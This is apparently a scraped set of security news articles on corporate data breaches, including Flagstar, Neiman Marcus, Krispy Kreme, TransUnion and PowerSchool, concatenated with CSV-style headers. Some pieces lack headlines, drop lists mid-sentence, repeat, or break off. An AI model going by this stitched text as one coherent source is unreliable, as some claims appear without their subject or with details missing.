Flagstar, now owned by the New York Community Bank, is a Michigan-based financial services provider that, before its acquisition last year, was one of the largest banks in the United States, having total assets of over $31 billion. A data breach notification sent to impacted customers explains that Flagstar was indirectly impacted by Fiserv, a vendor it uses for payment processing and mobile banking services. Fiserv was breached in the widespread CLOP MOVEit Transfer data theft attacks that have impacted over 64 million people and two thousand organizations worldwide, according to a report by Emsisoft . The attackers exploited a zero-day vulnerability in the MOVEit Transfer product to access Fiserv’s systems and, from there, stole Flagstar customer data the vendor held to provide services. The types of data that were compromised are redacted in the sample data breach notification letters. However, the entry on Maine’s data breach portal lists at least names and Social Security Numbers (SSNs) as stolen by the threat actors. The total number of Flagstar Bank customers impacted by this incident is 837,390 in the United States. This latest breach is the third for Flagstar since March 2021, when it disclosed it suffered a breach from the Clop ransomware gang, who, at that time, hacked its Accellion file transfer server in January of that year. Based on the data samples posted by the ransomware gang, the hackers managed to steal customer and employee information, including names, addresses, phone numbers, tax records, and SSNs. In June 2022, Flagstar disclosed another breach of its corporate network that impacted over 1.5 million of its customers in the U.S. The data compromised in that incident includes at least names and Social Security Numbers. At the time, the company opted again to censor the relevant section on the published notification samples. What is more worrying is that Fiserv offers services to hundreds of banks, which it has indirectly exposed in the past due to other security lapses.

""On October 8, 2023, we identified an interruption to our computer network. As a result, we immediately took steps to secure our systems and engaged third-party cybersecurity experts,"" reads the notification sent to impacted individuals. ""Our information technology systems (""IT System"") were restored the next business day, and prescriptions were shipped on time without delay."" The impact on its business operations was kept to a minimum, with no delays in the shipment of medical prescriptions or pharmacy claims. While their systems were restored in a day, investigating whether personal data was stolen took much longer.

This investigation revealed that the hackers first accessed customer data on October 3, 2023. ""As part of the investigation, we learned that an unauthorized third party was able to access certain non-clinical systems and obtained files that contained personal information,"" informs Sav-Rx. The types of data exposed in this incident include: In a FAQ page on its site, Sav-Rx explains that it took them eight months to send out notices of breach to impacted customers because their initial priority was to minimize interruption to patient care before launching an investigation on the impact of the incident. Sav-Rx also noted that it didn't rush to conclude the investigations, striving for as accurate results as possible. It says its health plan customers (impacted organizations) were notified earlier, between April 30 and May 2, 2024. Sav-Rx then reached an agreement with its business customers to notify impacted individuals, and hence, the letters were circulated late last week. The company notes that it did not have sufficient contact information to notify some individuals in many cases, so people are urged to confirm if they're affected by calling 888-326-0815. Among the new security measures Sav-Rx implemented in response to this incident are setting up a 24/7 security operations center, implementing multi-factor authentication on critical accounts, network segmentation, enhanced geo-blocking, upgraded firewalls and switches, strengthened Linux security, and BitLocker encryption. Though the firm currently has no evidence that the stolen information was misused or disseminated on the dark web, it enclosed instructions in the letters on enrolling in a two-year credit monitoring and identity theft protection service.

Neiman Marcus confirms data breach after Snowflake account hack,https://www.bleepingcomputer.com/news/security/neiman-marcus-confirms-data-breach-after-snowflake-account-hack/#comment_form,Lawrence Abrams,"June 25, 2024","Luxury retailer Neiman Marcus confirmed it suffered a data breach after hackers attempted to sell the company's database stolen in recent Snowflake data theft attacks. In a data breach notification filed with the Office of the Maine Attorney General, the company says that the breach impacted 64,472 people. ""In May 2024, we learned that, between April and May 2024, an unauthorized third party gained access to a database platform used by Neiman Marcus Group. Based on our investigation, the unauthorized third party obtained certain personal information stored in the database platform,"" warns Neiman Marcus in a data breach notification. ""The types of personal information affected varied by individual, and included information such as name, contact information, date of birth, and Neiman Marcus or Bergdorf Goodman gift card number(s) (without gift card PINs)."" Neiman Marcus said they disabled access to the database platform when the breach was detected, investigated with cybersecurity experts, and notified law enforcement. While gift card numbers for Neiman Marcus and Bergdorf Goodman were exposed in the breach, the data did not include PINs, so the gift cards should still be valid. In a statement to BleepingComputer, Neiman Marcus confirmed that the data was stolen from their Snowflake account. ""Neiman Marcus Group (NMG) recently learned that an unauthorized party gained access to a cloud database platform used by NMG that is provided by a third party, Snowflake,"" the Neiman Marcus Group told BleepingComputer. The data breach notifications come after a threat actor named ""Sp1d3r"" put Neiman Marcus' data up for sale on a hacking forum for $150,000, as first shared by HackManac . This threat actor is behind the sale of data for numerous companies breached in the recent Snowflake data theft attacks . While the threat actor did not mention Snowflake in the post, they included ""Raped Flake,"", which is in reference to a custom tool of the same name the threat actors created to steal data from the database platform. According to the threat actor, the stolen data included what Neiman Marcus shared, plus the last four digits of social security numbers, customer transactions, customer emails, shopping records, employee data, and millions of gift card numbers. The threat actor claims to have attempted to extort the company before the forum posting, stating that the company refused to pay an extortion demand. However, soon after the post was made on the forum, it was subsequently taken down along with the data sample, indicating that the company may have begun negotiating with the threat actors. A joint investigation by SnowFlake, Mandiant, and CrowdStrike revealed that a threat actor, tracked as UNC5537, used stolen customer credentials to target at least 165 organizations that had not configured multi-factor authentication protection on their accounts. Mandiant also linked the Snowflake attacks to a financially motivated threat actor tracked as UNC5537 since May 2024. This threat actor is known for breaching organizations, stealing data, and attempting to extort companies into paying a ransom for the data not to be published or leaked to other threat actors. While Mandiant has not publicly disclosed much information about UNC5537, BleepingComputer has learned they are part of a community of threat actors who frequently visit the same websites, Telegram and Discord servers. To breach Snowflake accounts, the threat actor used credentials stolen by information-stealing malware infections dating back to 2020. ""The impacted accounts were not configured with multi-factor authentication enabled, meaning successful authentication only required a valid username and password,"" Mandiant said. ""Credentials identified in infostealer malware output were still valid, in some cases years after they were stolen, and had not been rotated or updated. The impacted Snowflake customer instances did not have network allow lists in place to only allow access from trusted locations.""

The university discovered the attack on September 27 and disclosed one month later that it was investigating a cybersecurity incident impacting SUDPS systems. In an update published on Monday, Stanford said the attackers didn't gain access to other systems outside the Department of Public Safety's network. ""The investigation determined that an unauthorized individual(s) gained access to the Department of Public Safety's network between May 12, 2023, and Sept. 27, 2023,"" the university said . According to data breach notifications filed with Maine's Attorney General , the attackers stole documents containing personally identifiable information (PII) belonging to 27,000 individuals. ""The personal information that may have been affected varies from person to person but could include date of birth, Social Security number, government ID, passport number, driver's license number, and other information the Department of Public Safety may have collected in its operations,"" Stanford added. ""For a small number of individuals, this information may also have included biometric data, health/medical information, email address with password, username with password, security questions and answers, digital signature, and credit card information with security codes."" While Stanford has not attributed the September incident to a specific ransomware operation, the Akira ransomware gang claimed the attack in October, saying they stole 430Gb of files from the university's systems. The cybercrime group has since published the stolen data on their dark web leak site, making it available for download via BitTorrent. ​The Akira ransomware operation emerged in March 2023 and quickly gained notoriety by targeting victims across various industry verticals. By June 2023, the Akira ransomware operators had developed and deployed a Linux encryptor to target VMware ESXi virtual machines widely used in enterprise environments.

The data allegedly comes from National Public Data, a company that collects and sells access to personal data for use in background checks, to obtain criminal records, and for private investigators. National Public Data is believed to scrape this information from public sources to compile individual user profiles for people in the US and other countries. In April, a threat actor known as USDoD claimed to be selling 2.9 billion records containing the personal data of people in the US, UK, and Canada that was stolen from National Public Data. At the time, the threat actor attempted to sell the data for $3.5 million and claimed it contained records for every person in the three countries. USDoD is a known threat actor who was previously linked to an attempted sale of InfraGard's user database in December 2023 for $50,000. BleepingComputer, at the time, contacted National Public Data and never received a response to our email. Since then, various threat actors have released partial copies of the data, with each leak sharing a different number of records and, in some cases, different data. On August 6th, a threat actor known as ""Fenice"" leaked the most complete version of the stolen National Public Data data for free on the Breached hacking forum. However, Fenice says the data breach was conducted by another threat actor named ""SXUL,"" rather than USDoD. The leaked data consists of two text files totaling 277GB and containing nearly 2.7 billion plaintext records, rather than the original 2.9 billion number originally shared by USDoD. While BleepingComputer can't confirm if this leak contains the data for every person in the US, numerous people have confirmed to us that it included their and family members' legitimate information, including those who are deceased. Each record consists of the following information - a person's name , mailing addresses , and social security number , with some records including additional information, like other names associated with the person. None of this data is encrypted. Previously leaked samples of this data also included phone numbers and email addresses, but these are not included in this 2.7 billion record leak. It is important to note that a person will have multiple records, one for each address they are known to have lived. This also means that this data breach did not impact 3 billion people as has been erroneously reported in many articles that did not properly research the data. Some people have also told BleepingComputer that their social security numbers were associated with other people they don't know, so not all the information is accurate. Finally, this data may be outdated, as it does not contain the current address for any of the people we checked, potentially indicating that the data was taken from an old backup. The data breach has led to multiple class action lawsuits against Jerico Pictures , which is believed to be doing business as National Public Data, for not adequately protecting people's data. If you live in the US, this data breach has likely leaked some of your personal information. As the data contains hundreds of millions of social security numbers, it is suggested that you monitor your credit report for fraudulent activity and report it to the credit bureaus if detected. Furthermore, as previously leaked samples also contained email addresses and phone numbers, you should be vigilant against phishing and SMS texts attempting to trick you into providing additional sensitive information.

The American multinational coffeehouse chain employed 22,800 people in 40 countries as of December 2023 and operates 1,521 shops and 15,800 points of access. It also manages four ""Doughnut Factories"" in the United States and 37 others internationally, and it partners with McDonald's to have its products sold in thousands of McDonald's locations worldwide. This week, in a filing with Maine's Office of the Attorney General, Krispy Kreme revealed that the November data breach had affected 161,676 individuals. ""On May 22, 2025, we determined that certain of your personal information was impacted by this incident,"" it told affected individuals in breach notification letters sent to impacted people. ""There is no evidence that your information has been misused, and we are not aware of any reports of identity theft or fraud as a direct result of this incident. While the company didn't reveal what data was exposed in the incident, a separate filing with Massachusetts' Attorney General discloses that stolen documents contained affected individuals' social security numbers, financial account information, and driver's license information. Krispy Kreme detected unauthorized activity on its IT systems on November 29 and disclosed the incident , along with disruptions to its online ordering, in an SEC filing filed on December 11. The company also took measures to contain the breach and hired external cybersecurity experts to assess the attack's full impact on its operations. While Krispy Kreme has yet to share additional details regarding the November breach, the Play ransomware gang claimed responsibility for the attack in late December, saying they also stole data from the company's network. Play ransomware claimed, without proof, that the allegedly stolen files contain ""private and personal confidential data, client documents, budget, payroll, accounting, contracts, taxes, IDs, finance information,"" and more. After negotiations with the company failed, the ransomware gang released multiple archives containing hundreds of GBs of documents on its dark web leak site on December 21. The Play ransomware operation emerged in June 2022, and its operators are known for stealing sensitive data from compromised systems and using double-extortion tactics to pressure victims into paying a ransom under the threat of leaking the stolen data online. Notable victims include cloud computing company Rackspace , car retailer giant Arnold Clark , the City of Oakland in California, Dallas County , the Belgian city of Antwerp , and, most recently, American semiconductor supplier Microchip Technology . In December, the FBI issued a joint advisory with CISA and the Australian Cyber Security Centre, warning that the Play ransomware gang had breached around 300 organizations globally as of October 2023. Update June 20, 06:21 EDT: Krispy Kreme says in a notice of data breach published on its official website that documents stolen in the November ransomware attack also contain health information. ""Types of information that were subject to unauthorized access vary by individual but may include: name, Social Security number, date of birth, driver’s license or state ID number, financial account information, financial account access information, credit or debit card information, credit or debit card information in combination with a security code, username and password to a financial account, passport number, digital signature, username and password, email address and password, biometric data, USCIS or Alien Registration Number, US military ID number, medical or health information, and health insurance information,"" the company states..

"Krispy Kreme says November data breach impacts over 160,000 people",https://www.bleepingcomputer.com/news/security/krispy-kreme-says-november-data-breach-impacts-over-160-000-people/,Sergiu Gatlan,"June 19, 2025","U.S. doughnut chain Krispy Kreme confirmed that attackers stole the personal information of over 160,000 individuals in a November 2024 cyberattack. The American multinational coffeehouse chain employed 22,800 people in 40 countries as of December 2023 and operates 1,521 shops and 15,800 points of access. It also manages four ""Doughnut Factories"" in the United States and 37 others internationally, and it partners with McDonald's to have its products sold in thousands of McDonald's locations worldwide. This week, in a filing with Maine's Office of the Attorney General, Krispy Kreme revealed that the November data breach had affected 161,676 individuals. ""On May 22, 2025, we determined that certain of your personal information was impacted by this incident,"" it told affected individuals in breach notification letters sent to impacted people. ""There is no evidence that your information has been misused, and we are not aware of any reports of identity theft or fraud as a direct result of this incident. While the company didn't reveal what data was exposed in the incident, a separate filing with Massachusetts' Attorney General discloses that stolen documents contained affected individuals' social security numbers, financial account information, and driver's license information. Krispy Kreme detected unauthorized activity on its IT systems on November 29 and disclosed the incident , along with disruptions to its online ordering, in an SEC filing filed on December 11. The company also took measures to contain the breach and hired external cybersecurity experts to assess the attack's full impact on its operations. While Krispy Kreme has yet to share additional details regarding the November breach, the Play ransomware gang claimed responsibility for the attack in late December, saying they also stole data from the company's network. Play ransomware claimed, without proof, that the allegedly stolen files contain ""private and personal confidential data, client documents, budget, payroll, accounting, contracts, taxes, IDs, finance information,"" and more. After negotiations with the company failed, the ransomware gang released multiple archives containing hundreds of GBs of documents on its dark web leak site on December 21. The Play ransomware operation emerged in June 2022, and its operators are known for stealing sensitive data from compromised systems and using double-extortion tactics to pressure victims into paying a ransom under the threat of leaking the stolen data online. Notable victims include cloud computing company Rackspace , car retailer giant Arnold Clark , the City of Oakland in California, Dallas County , the Belgian city of Antwerp , and, most recently, American semiconductor supplier Microchip Technology . In December, the FBI issued a joint advisory with CISA and the Australian Cyber Security Centre, warning that the Play ransomware gang had breached around 300 organizations globally as of October 2023. Update June 20, 06:21 EDT: Krispy Kreme says in a notice of data breach published on its official website that documents stolen in the November ransomware attack also contain health information. ""Types of information that were subject to unauthorized access vary by individual but may include: name, Social Security number, date of birth, driver’s license or state ID number, financial account information, financial account access information, credit or debit card information, credit or debit card information in combination with a security code, username and password to a financial account, passport number, digital signature, username and password, email address and password, biometric data, USCIS or Alien Registration Number, US military ID number, medical or health information, and health insurance information,"" the company states..

SurveyLama is an online platform that rewards registered users for completing surveys. Owned by French firm Globe Media, the platform is praised for high payouts (up to $20), fast payments, and multiple withdrawal options. In early February, HIBP's creator, Troy Hunt, received information about a data breach impacting the service, which involved various data types, including: Hunt told BleepingComputer that he was notified of the exposure by one of the impacted users and independently verified the data. When contacted by HIBP inquiring about the authenticity of the data, SurveyLama said that they had already notified impacted users via email, confirming the security incident. The data set contains information about 4,426,879 accounts and was added to HIBP yesterday, so impacted users should have already received an email notification. The platform said the exposed passwords were stored either in salted SHA-1, bcrypt, or argon2 hashes form, so they are not in directly usable cleartext. Though hashing adds some resistance to cracking, it is not impervious to brute-forcing, especially the passwords protected with salted SHA-1, which carries known vulnerabilities, making it susceptible to collision attacks. That said, SurveyLama account holders should reset their passwords on the service immediately and on other platforms where they might use the same credentials. Hunt told BleepingComputer he was not aware that the compromised data had been posted anywhere publicly, making the exposure currently limited. However, if the dataset has fallen into the wrong hands, it could be exploited privately and then eventually leaked to the broader cybercrime community, so users must take protective measures as soon as possible.

Home Depot is the largest home improvement retailer, with more than 2,300 stores in North America and over 475,000 employees. On Thursday, a threat actor known as IntelBroker leaked limited data for approximately 10,000 Home Depot employees on a hacking forum. ""In April 2024, Home Depot suffered a data breach that exposed the corporate information belonging to 10K employees of the company,"" reads the forum post. After BleepingComputer contacted Home Depot, the company confirmed that one of its third-party SaaS vendors mistakenly exposed sample employee data. ""A third-party Software-as-a-Service (SaaS) vendor inadvertently made public a small sample of Home Depot associates' names, work email addresses and User IDs during testing of their systems,"" Home Depot told BleepingComputer. While this data is not highly sensitive, exposing only corporate IDs, names, and email addresses, it could be used by threat actors to conduct targeted phishing attacks against Home Depot employees. These phishing attacks could be designed to gather more sensitive information, such as Home Depot credentials, which could then be sold to other threat actors or used to breach the company's network to steal corporate data or deploy ransomware. For this reason, all Home Depot employees should be wary of any emails containing links to pages that request corporate credentials or other information. If one of these emails is received, it should be reported to the company's IT staff, who can verify whether it is legitimate. ​IntelBroker is a well-known threat actor who first gained notoriety by breaching DC Health Link , an organization that administers the health care plans of U.S. House members, their staff, and their families.

Casio detected the incident on Wednesday, October 11, following the failure of a ClassPad database within the company's development environment. Evidence suggests that the attacker accessed customers' personal information a day later, on October 12. The exposed data includes customer names, email addresses, countries of residence, service usage details, and purchase information such as payment methods, license codes, and order specifics. Casio says that credit card information was not stored within the compromised database. As of October 18, the attackers accessed 91,921 items belonging to Japanese customers (including individuals and 1,108 educational institution customers) and 35,049 records belonging to customers from 148 countries and regions outside Japan. ""At this time, it has been confirmed that some of the network security settings in the development environment were disabled due to an operational error of the system by the department in charge and insufficient operational management,"" the company said . ""Casio believes these were the causes of the situation that allowed an external party to gain unauthorized access."" Although the compromised database is currently ""inaccessible to external entities,"" the ClassPad.net app remains operational. Casio clarified that the hackers did not infiltrate systems beyond the compromised database within the development environment. On Monday, October 16, Casio reported the incident to Japan's Personal Information Protection Commission and is collaborating with law enforcement authorities, assisting with their breach investigation. Additionally, Casio is working with external cybersecurity and forensics experts to conduct an internal investigation to find the underlying causes of the incident and draw up countermeasures in response to the breach.

End-user cybersecurity errors that can cost you millions,https://www.bleepingcomputer.com/news/security/end-user-cybersecurity-errors-that-can-cost-you-millions/#comment_form,Home,"July 22, 2024","In today’s fast-paced organizations, end-users will sometimes try to take a shortcut. We've all been there — rushing to meet a deadline, juggling multiple tasks, or just trying to be helpful. But the reality is that letting even well-intentioned actions can come back to bite you. Picture this: an employee innocently lets a family member use their work laptop at home, thinking, ""What's the harm?"" But unbeknownst to them, their loved one accidentally downloads malware that spreads through your company's network, wreaking havoc on sensitive data and critical systems. Suddenly, that minor favor has morphed into a multimillion-dollar nightmare. It's not just a hypothetical scenario. The World Economic Forum has found that 95% of all cybersecurity incidents can be traced back to human error. Despite all the cutting-edge security technologies and ironclad protocols, the unintentional missteps of well-meaning end-users often open the door to disaster. And the cost of these blunders? According to IBM , the average global cost of a data breach in 2023 hit a staggering USD 4.45 million, a 15% increase over the past three years. That's not just a financial blow; it's a potentially business-ending event. To better understand the risks, we can examine five of the most frequent cybersecurity blunders committed by well-meaning employees. 1. Allowing unauthorized device access Proofpoint's User Risk Security Report reveals that half of working adults let friends and family members use their work devices at home. It seems harmless enough, but those loved ones could stumble upon sensitive company data or unwittingly access unsafe websites and applications. And if the unauthorized user downloads malware? Cybercriminals could gain access to corporate data, cloud applications, and storage, opening up a Pandora's box of security risks, including data breaches, intellectual property theft, and reputational damage. To address this risk, you should implement strict security controls, like password protection and two-factor authentication, and drill the importance of device sanctity into your employees' minds. A one-time onboarding security training won’t cut it; instead, introduce a comprehensive information security plan that all employees must follow and encourage team leaders to enforce cybersecurity discipline within their teams. 2. Misdelivery of sensitive information Imagine one of your end-users accidentally sending an email packed with confidential data to the wrong recipient. This is something that happens more often than you'd think, especially in industries like healthcare, where misdelivery is the most common error leading to a data breach. To prevent these mix-ups, consider requiring encryption for sensitive emails, implementing pop-up reminders for double-checking addresses, and deploying data loss prevention solutions that act as a safety net. You can have an effective password policy in place, but if your employees are reusing their passwords on less-secure personal devices, websites, and applications, then they’re still leaving the door wide open for cybercriminals. While there’s no 100% foolproof way to stop end-users from making the mistake of reusing passwords, solutions like Specops Password Policy can at least help you know if their passwords have become compromised. The solution continuously checks your Active Directory against a database of more than 4 billion unique breached passwords, alerting users to change if their found to be using a compromised password. 4. Exposing remote interfaces Remote work has also introduced a new set of challenges. IT teams often need to perform remote management tasks, but exposing administrative interfaces to the internet is like handing the keys to your kingdom to anyone with a Wi-Fi connection. To allow remote access without opening your virtual front door, you must be selective about what you expose online. Additionally, employing automated maintenance solutions will help you minimize vulnerabilities and risks. 5. Misusing privileged accounts It’s important to remember that your IT employees are humans, too, and they may take risks they know they shouldn’t. For example, it’s tempting for an IT admin to work from their privileged account even if they’re just handling everyday IT tasks — it’s convenient, and it keeps them from having to switch back and forth between their admin and user account. But that convenience comes at a steep price; if their admin account gets compromised, it's a major risk. The safest bet? Separate user accounts with limited privileges for daily work, reserving admin powers for critical tasks only. Implement the principle of least privilege (PoLP), ensuring that employees only have access to the resources and permissions necessary to perform their specific job functions. And regularly review and audit user permissions, revoking any unnecessary privileges promptly. In the end, cybersecurity is a team sport. No matter how robust your technical defenses are, your people are often the first line of defense — and your weakest link. By understanding the common pitfalls and implementing smart policies and training, you can transform your workforce from liability to asset in the battle against cyber threats. After all, when protecting your business, an ounce of prevention is worth millions in cure. Interested to know how many open risks could be lurking within your Active Directory?

Delta Dental of California data breach exposed info of 7 million people,https://www.bleepingcomputer.com/news/security/delta-dental-of-california-data-breach-exposed-info-of-7-million-people/#comment_form,Bill Toulas,"December 15, 2023","Delta Dental of California and its affiliates are warning almost seven million patients that they suffered a data breach after personal data was exposed in a MOVEit Transfer software breach. Delta Dental of California is a dental insurance provider that covers 45 million people across 15 states and is part of the Delta Dental Plans Association. According to a Delta Dental of California data breach notification , the company suffered unauthorized access by threat actors through the MOVEit file transfer software application. The software was vulnerable to a zero-day SQL injection flaw leading to remote code execution, tracked as CVE-2023-34362 , which the Clop ransomware gang leveraged to breach thousands of organizations worldwide.

On Sunday, a person claimed to be selling the data for 48,606,700 Europcar.com customers on a popular hacking forum. The post included samples of the stolen data for 31 alleged Europcar customers, including names, addresses, birth dates, driver's license numbers, and other information. However, after contacting Europcar last night, BleepingComputer was told that the breach was fake and that the data was fabricated using artificial intelligence. ""After being notified by a threat intel service that an account pretends to sell Europcar data on the dark net and thoroughly checking the data contained in the sample, we are confident that this advertisement is false: - the number of records is completely wrong & inconsistent with ours, - the sample data is likely ChatGPT-generated (addresses don't exist, ZIP codes don't match, first name and last name don't match email addresses, email addresses use very unusual TLDs), - and most importantly: none of these email addresses are present in our database.""

The second indicator that the data is fake is that the addresses simply do not exist. For example, two of the listed customer records use the non-existent towns of ""Lake Alyssaberg, DC"" and ""West Paulburgh, PA."" Another indicator is that the addresses and phone numbers are for regions in the U.S., yet many of the associated emails are for other countries. While Europcar told BleepingComputer they believe this data was created using AI, Hunt points out that some of the email addresses are real, appearing in previous data breaches monitored by Have I Been Pwned. Instead, Hunt believes the mention of artificial intelligence is just a hot take based on the subject's popularity and was not involved in creating this data. ""We've had fabricated breaches since forever because people want airtime or to make a name for themselves or maybe a quick buck,"" explains Hunt .

The case concerns a data breach at Financial Business and Consumer Solutions (FBCS), a debt collection agency in the U.S. that partners with various companies to collect unpaid debts on their behalf. Last April this year, FBCS informed of a data breach determined to have occurred between February 14 and February 26, 2024, when threat actors breached its network and stole the following details from its electronic records: The data breach was initially believed to have impacted 1.9 million people , but subsequent findings upped the tally to 3.2 million in June and, finally, 4.2 million individuals in July. The internal investigation into the incident appears to be ongoing, as FBCS recently informed additional entities that they had been impacted, including Comcast and Truist. Also, it is now made known that due to FBCS's worsening financial position, presumably a direct result of the breach, entities indirectly impacted by the incident will have to undertake the notification and remediation processes themselves. Comcast says FBCS assured them in March that the security incident impacted no customer data. However, on July 17, FBCS notified Comcast that its customer data was also impacted. According to a notice submitted to the Maine authorities , 273,703 Comcast customers were impacted by the breach. ""FBCS's investigation discovered that files downloaded by the unauthorized party included your name, address, Social Security number, date of birth, and your Comcast account number and ID numbers used internally at FBCS,"" reads the notification sent to impacted customers . ""FBCS states that it has no indication that any personal information compromised during this incident has been further misused."" Impacted people were given 12 months of free-of-charge identity theft protection services, with activation instructions enclosed. In related news, Truist Bank, one of the largest banks in the United States, also sent notices of a data breach to its customers linked to the FBCS incident. The letters were sent out in mid-September, but a sample was submitted more recently to the Californian authorities. ""FBCS has indicated that the type of information that may have been impacted varies per person and may include consumer name, address, account number, date of birth and Social Security number,"" disclosed Truist Bank. Truist operates over 2,700 branches across 15 states and employs 40,000 people. As such, the number of impacted people could be significant, though it has not been specified. BleepingComputer emailed Truist to learn how many of its customers were impacted by this incident, but a comment wasn't immediately available. Meanwhile, last June, Truist Bank confirmed a separate breach that reportedly occurred in October 2023 after a threat actor leaked stolen data on a hacking forum.

Last April this year, FBCS informed of a data breach determined to have occurred between February 14 and February 26, 2024, when threat actors breached its network and stole the following details from its electronic records: The data breach was initially believed to have impacted 1.9 million people , but subsequent findings upped the tally to 3.2 million in June and, finally, 4.2 million individuals in July. The internal investigation into the incident appears to be ongoing, as FBCS recently informed additional entities that they had been impacted, including Comcast and Truist. Also, it is now made known that due to FBCS's worsening financial position, presumably a direct result of the breach, entities indirectly impacted by the incident will have to undertake the notification and remediation processes themselves. Comcast says FBCS assured them in March that the security incident impacted no customer data. However, on July 17, FBCS notified Comcast that its customer data was also impacted. According to a notice submitted to the Maine authorities , 273,703 Comcast customers were impacted by the breach. ""FBCS's investigation discovered that files downloaded by the unauthorized party included your name, address, Social Security number, date of birth, and your Comcast account number and ID numbers used internally at FBCS,"" reads the notification sent to impacted customers . ""FBCS states that it has no indication that any personal information compromised during this incident has been further misused."" Impacted people were given 12 months of free-of-charge identity theft protection services, with activation instructions enclosed. In related news, Truist Bank, one of the largest banks in the United States, also sent notices of a data breach to its customers linked to the FBCS incident. The letters were sent out in mid-September, but a sample was submitted more recently to the Californian authorities. ""FBCS has indicated that the type of information that may have been impacted varies per person and may include consumer name, address, account number, date of birth and Social Security number,"" disclosed Truist Bank. Truist operates over 2,700 branches across 15 states and employs 40,000 people. As such, the number of impacted people could be significant, though it has not been specified. BleepingComputer emailed Truist to learn how many of its customers were impacted by this incident, but a comment wasn't immediately available. Meanwhile, last June, Truist Bank confirmed a separate breach that reportedly occurred in October 2023 after a threat actor leaked stolen data on a hacking forum.

Advance Auto Parts data breach impacts 2.3 million people,https://www.bleepingcomputer.com/news/security/advance-auto-parts-data-breach-impacts-23-million-people/,Bill Toulas,"July 11, 2024","Advance Auto Parts is sending data breach notifications to over 2.3 million people whose personal data was stolen in recent Snowflake data theft attacks. Advance operates 4,777 stores and 320 Worldpac branches, serving 1,152 independently owned Carquest stores in the United States, Canada, Puerto Rico, the U.S. Virgin Islands, Mexico, and various Caribbean islands. On June 5, 2024, a threat actor known as 'Sp1d3r' began selling a massive 3TB database allegedly containing 380 million Advance customer records, orders, transaction details, and other sensitive information. On June 19, the company confirmed the breach via a Form 8-K filing but said it only impacts current and former employees and job applicants. The incident was part of a broader campaign targeting Snowflake accounts using stolen credentials, which impacted Pure Storage , Los Angeles Unified , Neiman Marcus , Ticketmaster , and Banco Santander . Advance has completed its internal investigation into the incident and has determined that the data breach impacted 2,316,591 million people. According to the data breach notification samples shared with the authorities , the threat actors maintained unauthorized access to Advance's Snowflake environment for over a month, starting mid-April 2024. ""Our investigation determined that an unauthorized third party accessed or copied certain information maintained by Advance Auto Parts from April 14, 2024, to May 24, 2024,"" reads the notice . ""We conducted a detailed review and analysis of the affected information to determine the types of information contained therein and to whom the information relates."" The data stolen by the attackers includes full names, Social Security numbers (SSNs), driver's licenses, and government ID numbers. The company says it collects this information as part of its job application process, so the 2.3 million figure is related to job applicants and former/current employees whose data was stored in the compromised cloud database. Those impacted are given 12 months of complimentary identity theft protection and credit monitoring services through Experian, and they have until October 1, 2024, to enroll. Potentially impacted individuals are advised to be vigilant for unsolicited communications, monitor their accounts closely, activate fraud alerts, and consider placing a credit freeze. The 2.3 million figure reported by Advance is a far cry from the threat actor's allegations about 380M records, and the data types confirmed to have been exposed aren't nearly as extensive as what 'Sp1d3r' offered for sale. However, samples of the stolen data seen by BleepingComputer appear to have contained customer information, so it's possible they will be notified in the future.

Consumer credit reporting giant TransUnion warns it suffered a data breach exposing the personal information of over 4.4 million people in the United States, with BleepingComputer learning the data was stolen from it's Salesforce account. TransUnion is one of the three major credit bureaus in the United States, alongside Equifax and Experian. It operates in 30 countries, employs 13,000 staff, and has an annual revenue of $3 billion. It collects and maintains credit information on over 1 billion consumers worldwide, with approximately 200 million of those based in the U.S. This information is shared with 65,000 businesses, including lenders, insurers, and employers. According to a filing submitted to the Office of the Maine AG, the breach occurred on July 28, 2025, and was discovered two days later. A sample of the notifications distributed to impacted clients earlier this week specifies that the incident involved a third-party application serving the company's consumer support operations. ""We recently experienced a cyber incident involving a third-party application serving our U.S. consumer support operations,"" reads the data breach notice . ""The unauthorized access includes some limited personal information belonging to you."" The data exposed in this incident was ""limited"" according to the company, although what exactly it might entail hasn't been specified in the sample notification. Instead, the letter underlines that no credit reports or core credit information were exposed in this incident. TransUnion is now offering those impacted 24 months of free credit monitoring and identity theft protection services. A wave of Salesforce data theft attacks has impacted numerous companies this year, including Google , Farmers Insurance , Allianz Life , Workday , Pandora , Cisco , Chanel , and Qantas . These attacks have been conducted by the Shiny Hunters extortion group , and more recently, by a cluster tracked as UNC6395 . After publishing this story, BleepingComputer confirmed with two sources, including ShinyHunters, that TransUnion's data breach is linked to these Salesforce attacks. The threat actor claims that the stolen data consists of over 13 million records, with 4.4 million records related to people in the US. A sample of the stolen data shared with BleepingComputer contains quite a lot of sensitive personal information, including names, billing addresses, phone numbers, email addresses, dates of birth, and unredacted Social Security Numbers of TransUnion customers. The data also includes the reason for the customer transaction, such as a request for a free credit report. In addition to customer data, the threat actors also claim to have stolen customer support tickets and messages that were stored in Salesforce. BleepingComputer contacted TransUnion with further questions about this breach, and we will update this article if we receive a response.

PowerSchool is a cloud-based software solutions provider for K-12 schools and districts, with more than 18,000 customers and supporting over 60 million students worldwide. In January, the education software giant disclosed that its PowerSource customer support portal was breached on December 19, 2024, using a subcontractor's stolen credentials. The attacker demanded a $2.85 million ransom in Bitcoin on December 28, 2024, after stealing the full names, physical addresses, phone numbers, passwords, parent information, contact details, Social Security numbers, and medical data of impacted students and faculty. As BleepingComputer first reported, the threat actor behind the December 2024 PowerSchool breach claimed to have stolen the personal data of 62.4 million students and 9.5 million teachers from 6,505 school districts across the U.S., Canada, and other countries. ""PowerSchool's failures violate both the Texas Deceptive Trade Practices Act and the Identity Theft Enforcement and Protection Act by misleading customers about its security practices and failing to take reasonable measures to protect sensitive information entrusted by Texas families and school districts,"" the Office of the Attorney General of Texas said . ""If Big Tech thinks they can profit off managing children's data while cutting corners on security, they are dead wrong. Parents should never have to worry that the information they provide to enroll their children in school could be stolen and misused. My office will do everything we can to hold PowerSchool accountable for putting Texas students, teachers, and families at risk,"" Attorney General Paxton added on Wednesday. In a private FAQ shared with customers and reviewed by BleepingComputer at the time, PowerSchool acknowledged that it had made a ransom payment to stop the data from being disclosed and received a video from the attacker claiming that the stolen data had been erased. However, someone claiming to be ShinyHunters began individually extorting school districts in early May, threatening to release the previously stolen student and teacher data if a ransom was not paid. The leader of ShinyHunters claimed to BleepingComputer that this person was an affiliate falsely impersonating the hacking group, who attempted to re-extort PowerSchool with data stolen in an earlier September 2024 breach seen by CrowdStrike . Later that month, 19-year-old college student Matthew D. Lane from Worcester, Massachusetts, pleaded guilty to orchestrating the massive cyberattack on PowerSchool with the help of several other conspirators and attempting to extort millions of dollars in exchange for not leaking the stolen data of millions. According to school notices and a DataBreaches.net report, the ransom demands sent to school districts claimed to be from 